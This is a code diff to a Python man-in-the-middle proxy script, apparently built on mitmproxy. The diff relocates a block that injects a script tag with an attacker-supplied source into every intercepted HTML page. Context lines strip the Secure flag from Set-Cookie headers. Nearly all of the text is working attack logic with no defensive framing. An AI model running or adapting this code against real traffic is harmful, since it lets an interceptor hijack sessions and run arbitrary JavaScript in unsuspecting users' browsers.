@@ -42,6 +42,20 @@ class Injector:
         cookies = flow.response.headers.get_all('Set-Cookie')
         cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
         flow.response.headers.set_all('Set-Cookie', cookies)
+        if self.path:
+            html = BeautifulSoup(flow.response.content, "html.parser")
+            print(self.path)
+            print(flow.response.headers["content-type"])
+            if flow.response.headers["content-type"] == 'text/html':
+                print(flow.response.headers["content-type"])
+                script = html.new_tag(
+                    "script",
+                    src=self.path,
+                    type='application/javascript')
+                html.body.insert(0, script)
+                flow.response.content = str(html).encode("utf8")
+                print("Script injected.")
+
     def request(flow):
         flow.request.headers.pop('If-Modified-Since', None)
         flow.request.headers.pop('Cache-Control', None)
@@ -58,22 +72,6 @@ class Injector:
             # Having no TLS Server Name Indication from the client and just an IP address as request.host
             # in transparent mode, TLS server name certificate validation would fail.
             flow.request.host = flow.request.pretty_host
-            
-            
-    if self.path:
-        html = BeautifulSoup(flow.response.content, "html.parser")
-        print(self.path)
-        print(flow.response.headers["content-type"])
-        if flow.response.headers["content-type"] == 'text/html':
-            print(flow.response.headers["content-type"])
-            script = html.new_tag(
-                "script",
-                src=self.path,
-                type='application/javascript')
-            html.body.insert(0, script)
-            flow.response.content = str(html).encode("utf8")
-                print("Script injected.")
-
 
 def start():
     parser = argparse.ArgumentParser()
